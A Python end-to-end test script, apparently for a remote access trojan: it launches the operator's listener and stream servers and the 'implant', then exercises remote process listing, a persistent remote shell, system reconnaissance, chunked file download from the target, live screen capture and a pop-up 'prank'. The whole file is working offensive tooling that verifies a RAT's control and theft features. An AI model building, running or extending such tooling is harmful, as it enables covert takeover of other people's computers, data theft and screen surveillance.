#!/usr/bin/env python3
# rat/test_e2e.py — headless end-to-end: listener + implant + stream + transfers.
import threading, time, sys, os, tempfile, base64

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gui_server as g
import client

results = []


def check(name, cond):
    results.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name)


srv = g.make_listener(g.CFG["PORT"])
ssrv = g.make_listener(g.CFG["STREAM_PORT"])
threading.Thread(target=g.accept_loop, args=(srv, None), daemon=True).start()
threading.Thread(target=g.accept_stream_loop, args=(ssrv, None), daemon=True).start()

threading.Thread(target=client.main, daemon=True).start()

cid = None
for _ in range(40):
    time.sleep(0.25)
    with g.CL:
        if g.CLIENTS:
            cid = list(g.CLIENTS)[0]
            break
check("implant checked in", cid)

r = g.call_target(cid, {"cmd": "ps"})
check("ps works", r.get("ok") and "python" in (r.get("out") or "").lower())

r = g.call_target(cid, {"cmd": "shell", "line": "cd C:\\Windows"})
check("shell cd tracked", r.get("ok") and str(r.get("cwd", "")).lower().endswith("windows"))
r = g.call_target(cid, {"cmd": "shell", "line": "echo hi"})
check("shell runs in cwd", r.get("ok") and "hi" in (r.get("out") or "") and str(r.get("cwd", "")).lower().endswith("windows"))

r = g.call_target(cid, {"cmd": "sysinfo"})
info = r.get("info", {})
check("sysinfo extended", r.get("ok") and "ip" in info and "ram" in info and "disks" in info and "uptime" in info)

tmp = os.path.join(tempfile.gettempdir(), "e2e_chunk.bin")
payload = os.urandom(2 * 1024 * 1024 + 12345)  # two full chunks + tail
with open(tmp, "wb") as f:
    f.write(payload)
r1 = g.call_target(cid, {"cmd": "dl_chunk", "path": tmp, "off": 0, "n": g.CFG["CHUNK"]})
r2 = g.call_target(cid, {"cmd": "dl_chunk", "path": tmp, "off": r1.get("n", 0), "n": g.CFG["CHUNK"]})
r3 = g.call_target(cid, {"cmd": "dl_chunk", "path": tmp, "off": r1.get("n", 0) + r2.get("n", 0), "n": g.CFG["CHUNK"]})
got = base64.b64decode(r1.get("data", "")) + base64.b64decode(r2.get("data", "")) + base64.b64decode(r3.get("data", ""))
check("dl_chunk reassembles", got == payload)
os.remove(tmp)

r = g.call_target(cid, {"cmd": "stream_open"})
check("stream_open", r.get("ok") and r.get("port") == g.CFG["STREAM_PORT"])
time.sleep(0.8)
with g.CL:
    sock = g.STREAMS.get(cid)
check("implant on stream channel", sock is not None)

frame_ok = False
if sock:
    try:
        g.send_frame(sock, {"cmd": "frame", "scale": 0.3, "quality": 30})
        fr = g.recv_frame(sock)
        frame_ok = "data" in fr and len(fr["data"]) > 1000
    except Exception as e:
        print("  stream err:", e)
check("live frame pulled", frame_ok)

r = g.call_target(cid, {"cmd": "prank", "name": "msgbox", "text": "e2e"})
check("prank fires while streaming", r.get("ok"))

r = g.call_target(cid, {"cmd": "stream_stop"})
check("stream_stop", r.get("ok"))

fails = [n for n, ok in results if not ok]
print(f"\n{len(results) - len(fails)}/{len(results)} passed")
os._exit(1 if fails else 0)
